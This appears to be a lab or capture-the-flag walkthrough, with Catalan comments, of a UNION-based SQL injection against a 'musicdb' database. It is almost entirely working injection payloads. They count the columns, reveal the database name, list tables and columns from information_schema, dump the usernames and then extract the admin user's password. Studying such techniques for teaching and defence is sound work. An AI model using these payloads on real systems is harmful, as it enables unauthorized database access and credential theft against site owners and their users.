--Vaig de 1 en 1 fins que al arribar a la columna 5 deixa de donar error

' UNION SELECT 1, 2, 3, 4, 5 -- - 

--Vaig probant a posar DATABASE() en les columnes fins que a la columna 3 dona resultat i es veu que la base de dades es musicdb

' UNION SELECT 1, 2, DATABASE(), 4, 5 -- -

-- Trec el nom de les taules de la base de dades 'musicdb'

' UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema = 'musicdb' -- -

-- Trec el nom de les columnes de la taula usuaris

' UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name = 'usuaris' AND table_schema = 'musicdb' -- -

-- Trec tots els noms d'usuari de la taula i trobo un que es diu 'admin'

' UNION SELECT 1, 2, nom_usuari, 4, 5 FROM usuaris -- -

-- Busco la contrasenya de l'usuari admin en la columna contrasenya

' UNION SELECT 1, 2, contrasenya, 4, 5 FROM usuaris  WHERE nom_usuari = 'admin' -- -
